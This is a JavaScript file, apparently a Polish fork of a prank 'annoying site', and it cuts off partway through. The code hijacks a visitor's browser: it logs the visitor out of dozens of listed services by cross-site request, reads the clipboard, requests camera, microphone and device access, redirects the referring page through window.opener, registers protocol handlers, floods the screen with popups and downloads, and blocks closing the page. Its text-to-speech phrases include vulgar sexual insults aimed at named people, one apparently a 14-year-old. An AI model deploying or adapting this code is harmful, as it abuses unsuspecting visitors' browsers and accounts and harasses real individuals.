const SCREEN_WIDTH = window.screen.availWidth const SCREEN_HEIGHT = window.screen.availHeight const WIN_WIDTH = 480 const WIN_HEIGHT = 260 const VELOCITY = 15 const MARGIN = 10 const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [ ┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊ ┈┈┈┈╭━━━━━━╮┊☆ ┊┊ ┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊ ┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊ ┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊ ☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊ ┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊, ░░▓▓░░░░░░░░▓▓░░ ░▓▒▒▓░░░░░░▓▒▒▓░ ░▓▒▒▒▓░░░░▓▒▒▒▓░ ░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░ ░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓ ▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓ ▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓ ▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓ ▓▒░░▒▒▒▒▒▒▒▒▒░░▓ ▓▒░░▒▓▒▒▓▒▒▓▒░░▓ ░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░ ░░▓▒▒▒▒▒▒▒▒▒▒▓░░ ░░░▓▓▓▓▓▓▓▓▓▓░░░ ]

const SEARCHES = [ 'antek', 'antoś', 'antoni', 'antek', 'antos' ]

const VIDEOS = [ 'media/videos/jaczup.mp4', 'media/videos/duck.mp4', 'media/videos/rickroll.mp4', 'media/videos/golomb.mp4', 'media/videos/mushbox.mp4', 'media/videos/clearmax.mp4', 'media/videos/freestrona.mp4', 'media/videos/ajhsdfhjasdbhfjasdfs.mp4', 'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov', 'media/videos/intro.mp4', 'media/videos/szybkakaczka.mp4', // added by @dan64iel 'media/videos/kaczuszka.mp4', //added by @imzeme 'media/videos/gratulacje.mp4' //added by @GameShoot8050 ]

const FILE_DOWNLOADS = [ 'media/images/ptok.jpg', 'media/images/jaczup.jpg', 'media/images/jaczupme.jpg', 'media/images/ptoszek.jpg', 'media/images/ptakwspodniach.jpg', 'media/images/kichajacyptoszek.jpg', 'media/images/lubieptoszki.png', 'media/images/zimowyptoszek.jpeg', // added by @dan64iel 'media/images/zlyptok.jpeg', //added by @imzeme 'media/images/grubyptok.jpg', //added by @imzeme 'media/images/ptokzjajami.jpeg', //added by @MARECKIyt 'media/images/ptiszka.jpg', ]

const PHRASES = [ 'skoncz sie kurwic dziecko masz 14 lat' 'magda ok jest zwykla kurwa' 'n4styaa jest zwyklym shonem' 'madzia ok to dziwka' 'wyliż mi cipke plis' 'hello my name is antek, lol', 'antki are funny lalalalalalalallalala', 'wgl co u cb bo u mn dbr', 'knuuurrr eksplozja', 'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw', 'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak', 'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo' ]

const LOGOUT_SITES = { Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}], Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'], DeviantART: ['POST', 'https://www.deviantart.com/users/logout'], Dropbox: ['GET', 'https://www.dropbox.com/logout'], eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'], GitHub: ['GET', 'https://github.com/logout'], GMail: ['GET', 'https://mail.google.com/mail/?logout'], Google: ['GET', 'https://www.google.com/accounts/Logout'], // works! Hulu: ['GET', 'https://secure.hulu.com/logout'], NetFlix: ['GET', 'https://www.netflix.com/Logout'], Skype: ['GET', 'https://secure.skype.com/account/logout'], SoundCloud: ['GET', 'https://soundcloud.com/logout'], 'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'], 'Steam Store': ['GET', 'https://store.steampowered.com/logout/'], Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'], 'Windows Live': ['GET', 'https://login.live.com/logout.srf'], Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'], Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'], YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }], JShop: ['GET', 'https://jshop.partners/panel/logout'], Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] // added by @MARECKIyt }

/**

Array to store the child windows spawned by this window. */ const wins = []


/**

Count of number of clicks  - added by @9fm */


let interactionCount = 0

//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm

/**

Number of iframes injected into the page for the "super logout" functionality.

See superLogout(). */ let numSuperLogoutIframes = 0


/**

Is this window a child window? A window is a child window if there exists a

parent window (i.e. the window was opened by another window so window.opener

is set) AND that parent is a window on the same origin (i.e. the window was

opened by us, not an external website) */ const isChildWindow = (window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1


/**

Is this window a parent window? */ const isParentWindow = !isChildWindow


/*

Run this code in all windows, both child and parent windows. */


init()

/*

Use window.opener to detect if this window was opened by another window, which

will be its parent. The window.opener variable is a reference to the parent

window. */ if (isChildWindow) initChildWindow() else initParentWindow()


/**

Initialization code for both parent and child windows. */ function init () { confirmPageUnload()


interceptUserInput(event => { interactionCount += 1

// Prevent default behavior (breaks closing window shortcuts)
event.preventDefault()
event.stopPropagation()

// 'touchstart' and 'touchend' events are not able to open a new window
// (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
// a clever way to exclude touch events.
if (event.which !== 0) openWindow()

startVibrateInterval()
enablePictureInPicture()
triggerFileDownload()

focusWindows()
copySpamToClipboard()
speak()
startTheramin()

// Capture key presses on the Command or Control keys, to interfere with the
// "Close Window" shortcut.
if (event.key === 'Meta' || event.key === 'Control') {
  window.print()
  requestWebauthnAttestation()
  window.print()
  requestWebauthnAttestation()
  window.print()
  requestWebauthnAttestation()
} else {
  requestPointerLock()

  if (!window.ApplePaySession) {
    // Don't request TouchID on every interaction in Safari since it blocks
    // the event loop and stops windows from moving
    requestWebauthnAttestation()
  }
  requestClipboardRead()
  requestMidiAccess()
  requestBluetoothAccess()
  requestUsbAccess()
  requestSerialAccess()
  requestHidAccess()
  requestCameraAndMic()
  requestFullscreen()
}

}) }

/**

Initialization code for child windows. */ function initChildWindow () { registerProtocolHandlers() hideCursor() moveWindowBounce() startVideo() detectWindowClose() triggerFileDownload() speak() rainbowThemeColor() animateUrlWithEmojis()


interceptUserInput(event => { if (interactionCount === 1) { startAlertInterval() } }) }

/**

Initialization code for parent windows. */ function initParentWindow () { showHelloMessage() blockBackButton() fillHistory() startInvisiblePictureInPictureVideo()


interceptUserInput(event => { // Only run these on the first interaction if (interactionCount === 1) { registerProtocolHandlers() attemptToTakeoverReferrerWindow() hideCursor() startVideo() startAlertInterval() superLogout() removeHelloMessage() rainbowThemeColor() animateUrlWithEmojis() speak('To był błąd') } }) }

/**

Sites that link to theannoyingsite.com may specify target='_blank' to open the

link in a new window. For example, Messenger.com from Facebook does this.

However, that means that window.opener will be set, which allows us to redirect

that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.

Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/ */ function attemptToTakeoverReferrerWindow () { if (isParentWindow && window.opener && !isParentSameOrigin()) { window.opener.location = ${window.location.origin}/?child=true } }


/**

Returns true if the parent window is on the same origin. It's not enough to check

that window.opener is set, because that will also get set if a site on a

different origin links to theannoyingsite.com with target='_blank'. */ function isParentSameOrigin () { try { // May throw an exception if window.opener is on another origin return window.opener.location.origin === window.location.origin } catch (err) { return false } }


/**

Ask the user "are you sure you want to leave this page?". In most browsers,

this will not actually do anything unless the user has at least one interaction

with the page before they close it. */ function confirmPageUnload () { window.addEventListener('beforeunload', event => { speak('Please don't go!') event.returnValue = true }) }


/**

Attempt to register all possible browser-whitelisted protocols to be handled by

this web app instead of their default handlers. */ function registerProtocolHandlers () { if (typeof navigator.registerProtocolHandler !== 'function') return


const protocolWhitelist = [ 'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms', 'news', 'ircs', 'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp' ]

const handlerUrl = window.location.href + '/url=%s'

protocolWhitelist.forEach(proto => { navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek') }) }

/**

Attempt to access the user's camera and microphone, and attempt to enable the

torch (i.e. camera flash) if the device has one. */ function requestCameraAndMic () { if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') { return }


navigator.mediaDevices.enumerateDevices().then(devices => { const cameras = devices.filter((device) => device.kind === 'videoinput')

if (cameras.length === 0) return
const camera = cameras[cameras.length - 1]

navigator.mediaDevices.getUserMedia({
  deviceId: camera.deviceId,
  facingMode: ['user', 'environment'],
  audio: true,
  video: true
}).then(stream => {
  const track = stream.getVideoTracks()[0]
  const imageCapture = new window.ImageCapture(track)

  imageCapture.getPhotoCapabilities().then(() => {
    // Let there be light!
    track.applyConstraints({ advanced: [{ torch: true }] })
  }, () => { /* No torch on this device */ })
}, () => { /* ignore errors */ })

}) }

/**

Animating the URL with emojis

See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/ */ function animateUrlWithEmojis () { if (window.ApplePaySession) { // Safari doesn't show the full URL anyway, so we can't animate it return } const rand = Math.random() if (rand < 0.33) { animateUrlWithBabies() } else if (rand < 0.67) { animateUrlWithWave() } else { animateUrlWithMoons() }


function animateUrlWithBabies () { const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

setInterval(() => {
  let s = ''
  let i; let m

  for (i = 0; i < 10; i++) {
    m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
    s += '👶' + e[m]
  }

  window.location.hash = s
}, 100)

}

function animateUrlWithWave () { setInterval(() => { let i; let n; let s = ''

for (i = 0; i < 10; i++) {
    n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

    s += String.fromCharCode(0x2581 + n)
  }

  window.location.hash = s
}, 100)

}

function animateUrlWithMoons () { const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'] const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0] let m = 0

setInterval(() => {
  let s = ''
  let x = 0

  if (!m) {
    while (d[x] === 4) {
      x++
    }

    if (x >= d.length) m = 1
    else {
      d[x]++
    }
  } else {
    while (d[x] === 0) {
      x++
    }

    if (x >= d.length) m = 0
    else {
      d[x]++

      if (d[x] === 8) d[x] = 0
    }
  }

  d.forEach(function (n) {
    s += f[n]
  })

  window.location.hash = s
}, 100)

} }

/**

Lock the user's pointer, without even being in full screen!

Require user-initiated event. */ function requestPointerLock () { const requestPointerLockApi = ( document.body.requestPointerLock || document.body.webkitRequestPointerLock || document.body.mozRequestPointerLock || document.body.msRequestPointerLock )


requestPointerLockApi.call(document.body) }

/**

Start vibrating the device at random intervals, on supported devices.

Requires user-initiated event. */ function startVibrateInterval () { if (typeof window.navigator.vibrate !== 'function') return setInterval(() => { const duration = Math.floor(Math.random() * 600) window.navigator.vibrate(duration) }, 1000)


// If the gamepad can vibrate, we will at random intervals every second. And at random strengths! window.addEventListener('gamepadconnected', (event) => { const gamepad = event.gamepad if (gamepad.vibrationActuator) { setInterval(() => { if (gamepad.connected) { gamepad.vibrationActuator.playEffect('dual-rumble', { duration: Math.floor(Math.random() * 600), strongMagnitude: Math.random(), weakMagnitude: Math.random() }) } }, 1000) } }) }

/**

Intercept all user-initiated events and call the given the function, onInput. */ function interceptUserInput (onInput) { document.body.addEventListener('touchstart', onInput, { passive: false })


document.body.addEventListener('mousedown', onInput) document.body.addEventListener('mouseup', onInput) document.body.addEventListener('click', onInput)

document.body.addEventListener('keydown', onInput) document.body.addEventListener('keyup', onInput) document.body.addEventListener('keypress', onInput) }

/**

Start an invisible, muted video so we have a one ready to put into

picture-in-picture mode on the first user-interaction. */ function startInvisiblePictureInPictureVideo () { const video = document.createElement('video') video.src = getRandomArrayEntry(VIDEOS) video.loop = true video.muted = true video.style = HIDDEN_STYLE video.autoplay = true video.play()


document.body.appendChild(video) }

/**

Active Safari's picture-in-picture feature, which let's show a video on the

desktop. Requires user-initiated event. */ function enablePictureInPicture () { const video = document.querySelector('video') if (document.pictureInPictureEnabled) { video.style = '' video.muted = false video.requestPictureInPicture() video.play() } }


/**

Focus all child windows. Requires user-initiated event. */ function focusWindows () { wins.forEach(win => { if (!win.closed) win.focus() }) }


/**

Open a new popup window. Requires user-initiated event. */ function openWindow () { const { x, y } = getRandomCoords() const opts = width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y} const win = window.open(window.location.pathname, '', opts)


// New windows may be blocked by the popup blocker if (!win) return wins.push(win)

if (wins.length === 2) setupSearchWindow(win)

// Added by @wetraks win.onunload = function () { // Some browsers might not support onunload, but include it for completeness return false; };

// For modern browsers win.addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; });

// For older browsers win.onbeforeunload = function () { return ""; }; // Added by @wetraks }

/**

Hide the user's cursor! */ function hideCursor () { document.querySelector('html').style = 'cursor: none;' }


/**

Trigger a file download immediately. One file download is allowed without user

interaction. Further file downloads should happen in response to a user-initiated

event or they will be blocked. */ function triggerFileDownload () { const fileName = getRandomArrayEntry(FILE_DOWNLOADS) const a = document.createElement('a') a.href = fileName a.download = fileName a.click() }


/**

Speak the given phrase using text-to-speech. */ function speak (phrase) { if (phrase == null) phrase = getRandomArrayEntry(PHRASES) window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase)) }


/**

Start an annoying theramin that changes pitch and volume depending on

the mouse position. Uses a Web Audio oscillator. Reauires user-initiated

event.

Based on https://github.com/feross/TheAnnoyingSite.com/pull/2 */ function startTheramin () { const audioContext = new AudioContext() const oscillatorNode = audioContext.createOscillator() const gainNode = audioContext.createGain()


const pitchBase = 50 const pitchRange = 4000

const wave = audioContext.createPeriodicWave( Array(10).fill(0).map((v, i) => Math.cos(i)), Array(10).fill(0).map((v, i) => Math.sin(i)) )

oscillatorNode.setPeriodicWave(wave)

oscillatorNode.connect(gainNode) gainNode.connect(audioContext.destination)

oscillatorNode.start(0)

const oscillator = ({ pitch, volume }) => { oscillatorNode.frequency.value = pitchBase + pitch * pitchRange gainNode.gain.value = volume * 3 }

document.body.addEventListener('mousemove', event => { const { clientX, clientY } = event const { clientWidth, clientHeight } = document.body const pitch = (clientX - clientWidth / 2) / clientWidth const volume = (clientY - clientHeight / 2) / clientHeight oscillator({ pitch, volume }) }) }

/**

Attempt to read the user's clipboard.

Requires user-initiated event. */ function requestClipboardRead () { try { navigator.clipboard.readText().then( data => { if (!window.ApplePaySession) { // Don't alert in Safari because it blocks the event loop window.alert("Successfully read data from clipboard: '" + data + "'") } }, () => {} ) } catch {} }


/**

Request Webauthn attestation.

Requires user-initiated event. */ function requestWebauthnAttestation () { try { // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

// sample arguments for registration const createCredentialDefaultArgs = { publicKey: { // Relying Party (a.k.a. - Service): rp: { name: 'Acme' },

 getCredentialDefaultArgs = { publicKey: { timeout: 60000, // allowCredentials: [newCredential] // see below challenge: new Uint8Array([ // must be a cryptographically random number sent from a server 0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3
